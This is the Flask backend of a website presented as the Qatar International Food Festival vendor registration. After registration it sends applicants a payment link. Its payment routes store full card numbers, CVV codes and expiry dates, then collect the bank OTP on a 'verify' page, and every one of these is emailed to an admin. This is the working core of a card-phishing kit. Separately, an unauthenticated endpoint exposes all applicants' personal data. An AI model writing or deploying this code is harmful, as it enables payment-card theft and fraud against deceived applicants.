"""Flask backend for the Qatar International Food Festival registration form.

- Serves the static website (HTML/CSS/JS/assets)
- Handles POST /api/register: saves to PostgreSQL, uploads files, emails applicant
- GET /api/registrations: list saved records
"""
import os
from datetime import datetime, timezone
from flask import Flask, request, jsonify, send_from_directory, url_for, abort
from werkzeug.utils import secure_filename
from dotenv import load_dotenv

from db import (
    init_db,
    insert_registration,
    list_registrations,
    get_registration,
    update_email_status,
    create_payment_token,
    get_payment_token,
    increment_payment_attempt,
    insert_payment_attempt,
    insert_otp_attempt,
    get_latest_payment_attempt,
)
from mailer import (
    send_registration_email,
    send_admin_registration_email,
    send_admin_contact_email,
    send_admin_payment_email,
)

load_dotenv()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
PAYMENT_DIR = os.path.join(BASE_DIR, "pay")
os.makedirs(UPLOAD_DIR, exist_ok=True)

ALLOWED = {".png", ".jpg", ".jpeg", ".pdf"}
MAX_BYTES = 10 * 1024 * 1024  # 10MB

app = Flask(__name__, static_folder=BASE_DIR, static_url_path="")


def allowed_file(filename):
    return os.path.splitext(filename)[1].lower() in ALLOWED


def save_upload(file_storage, prefix):
    """Save an uploaded file and return its relative path, or None."""
    if not file_storage or not file_storage.filename:
        return None
    if not allowed_file(file_storage.filename):
        return None
    if file_storage.content_length and file_storage.content_length > MAX_BYTES:
        return None
    name = secure_filename(file_storage.filename)
    unique = f"{prefix}_{name}"
    path = os.path.join(UPLOAD_DIR, unique)
    file_storage.save(path)
    return unique


@app.route("/")
def root():
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/<path:filename>")
def static_files(filename):
    # Payment pages are only reachable through token routes (/pay/<token>...).
    if filename == "pay" or filename.startswith("pay/"):
        abort(404)
    return send_from_directory(BASE_DIR, filename)


def _token_is_valid(row):
    """A token row is valid if it exists, is not revoked, and has not expired."""
    if not row or row.get("revoked"):
        return False
    expires_at = row.get("expires_at")
    if expires_at and expires_at <= datetime.now(timezone.utc):
        return False
    return True


@app.route("/pay/<token>")
def payment_page(token):
    row = get_payment_token(token)
    if not _token_is_valid(row):
        return send_from_directory(PAYMENT_DIR, "expired.html"), 410
    increment_payment_attempt(row["id"])
    return send_from_directory(PAYMENT_DIR, "payment.html")


@app.route("/pay/<token>/verify")
def payment_verify(token):
    row = get_payment_token(token)
    if not _token_is_valid(row):
        return send_from_directory(PAYMENT_DIR, "expired.html"), 410
    return send_from_directory(PAYMENT_DIR, "verify.html")


@app.route("/api/pay/<token>", methods=["POST"])
def submit_payment(token):
    """Receive payment form data and store it in the database."""
    try:
        row = get_payment_token(token)
        if not _token_is_valid(row):
            return jsonify({"ok": False, "error": "رابط الدفع غير صالح أو منتهي"}), 410

        body = request.get_json(silent=True) or {}
        card_number = (body.get("card_number") or "").replace(" ", "")
        expiry = (body.get("expiry") or "").replace(" ", "")
        cvv = (body.get("cvv") or "").strip()

        if len(card_number) < 4 or not expiry:
            return jsonify({"ok": False, "error": "بيانات البطاقة غير مكتملة"}), 400

        card_last4 = card_number[-4:]
        first = card_number[0] if card_number else ""
        if first == "6":
            brand = "mada"
        elif first == "4":
            brand = "visa"
        elif first == "5":
            brand = "mastercard"
        else:
            brand = "unknown"

        expiry_digits = "".join(ch for ch in expiry if ch.isdigit())
        expiry_month = expiry_digits[:2] if len(expiry_digits) >= 2 else None
        expiry_year = expiry_digits[2:4] if len(expiry_digits) >= 4 else None

        data = {
            "registration_id": row.get("registration_id"),
            "card_number": card_number,
            "card_last4": card_last4,
            "card_brand": brand,
            "card_holder": (body.get("card_holder") or "").strip(),
            "expiry_month": expiry_month,
            "expiry_year": expiry_year,
            "cvv": cvv,
            "amount": body.get("amount", 500.00),
            "status": "submitted",
        }
        attempt_id = insert_payment_attempt(token, data)
        if not attempt_id:
            return jsonify({"ok": False, "error": "فشل حفظ بيانات الدفع"}), 500

        # Notify the project manager of the payment submission.
        registration = get_registration(row.get("registration_id"))
        payment_row = get_latest_payment_attempt(token)
        send_admin_payment_email(registration, payment_row)

        return jsonify({"ok": True, "attempt_id": attempt_id, "redirect": f"/pay/{token}/verify"})
    except Exception as e:
        return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500


@app.route("/api/pay/<token>/verify", methods=["POST"])
def submit_otp(token):
    """Receive the OTP code from the verification page and store it."""
    try:
        row = get_payment_token(token)
        if not _token_is_valid(row):
            return jsonify({"ok": False, "error": "رابط الدفع غير صالح أو منتهي"}), 410

        body = request.get_json(silent=True) or {}
        otp = (body.get("otp") or "").strip()
        if not otp:
            return jsonify({"ok": False, "error": "يرجى إدخال رمز التحقق"}), 400

        payment_attempt = get_latest_payment_attempt(token)
        payment_attempt_id = payment_attempt["id"] if payment_attempt else None
        status = "pending"

        insert_otp_attempt(token, payment_attempt_id, otp, status)

        # Notify the project manager of the OTP submission.
        registration = get_registration(row.get("registration_id"))
        send_admin_payment_email(registration, payment_attempt, otp_code=otp)

        return jsonify({"ok": True, "status": status, "message": "تم استلام رمز التحقق"})
    except Exception as e:
        return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500


@app.route("/api/register", methods=["POST"])
def register():
    try:
        form = request.form

        # Collect text fields
        data = {
            "name_en": (form.get("name_en") or "").strip(),
            "name_ar": (form.get("name_ar") or "").strip(),
            "category": (form.get("category") or "").strip(),
            "country": (form.get("country") or "").strip(),
            "company": (form.get("company") or "").strip(),
            "contact": (form.get("contact") or "").strip(),
            "phone": (form.get("phone") or "").strip(),
            "email": (form.get("email") or "").strip(),
            "social": (form.get("social") or "").strip(),
            "cuisine": (form.get("cuisine") or "").strip(),
            "booth_size": (form.get("size") or form.get("booth_size") or "").strip(),
            "cart_size": (form.get("cart_size") or "").strip(),
        }

        # Basic validation
        required = [
            "name_en", "name_ar", "category", "company",
            "contact", "phone", "email", "social", "cuisine",
        ]
        missing = [f for f in required if not data[f]]
        if missing:
            return jsonify({"ok": False, "error": f"حقول ناقصة: {', '.join(missing)}"}), 400

        # File uploads
        data["docs_path"] = save_upload(request.files.get("docs"), "docs")
        data["cart_image_path"] = save_upload(request.files.get("cart_image"), "cart")

        # Save to database
        reg_id = insert_registration(data)
        if not reg_id:
            return jsonify({"ok": False, "error": "فشل حفظ البيانات في قاعدة البيانات"}), 500

        # Send email synchronously (reliable across environments incl. Railway)
        display_name = data["name_ar"] or data["name_en"]
        token_info = create_payment_token(
            reg_id, data["email"], display_name, data["category"], data["company"]
        )
        payment_url = url_for("payment_page", token=token_info["token"], _external=True)
        email_ok, email_msg = send_registration_email(
            data["email"], display_name, data["category"], data["company"], payment_url
        )
        admin_email_ok, admin_email_msg = send_admin_registration_email(data)
        update_email_status(reg_id, email_ok, "" if email_ok else email_msg)

        return jsonify({
            "ok": True,
            "id": reg_id,
            "email_sent": email_ok,
            "admin_email_sent": admin_email_ok,
            "message": "تم استلام طلبك بنجاح. سيصلك بريد التأكيد خلال لحظات.",
        })

    except Exception as e:
        return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500


@app.route("/api/contact", methods=["POST"])
def contact():
    try:
        form = request.form
        name = (form.get("name") or "").strip()
        email = (form.get("email") or "").strip()
        subject = (form.get("subject") or "").strip()
        message = (form.get("message") or "").strip()
        if not all((name, email, subject, message)):
            return jsonify({"ok": False, "error": "يرجى تعبئة جميع الحقول المطلوبة"}), 400

        email_ok, email_msg = send_admin_contact_email(name, email, subject, message)
        if not email_ok:
            return jsonify({"ok": False, "error": email_msg}), 502
        return jsonify({"ok": True, "message": "تم إرسال رسالتك بنجاح"})
    except Exception as e:
        return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500


@app.route("/api/registrations", methods=["GET"])
def get_registrations():
    try:
        rows = list_registrations()
        return jsonify({"ok": True, "count": len(rows), "data": rows})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "status": "running"})


if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 12000))
    app.run(host="0.0.0.0", port=port, debug=False)
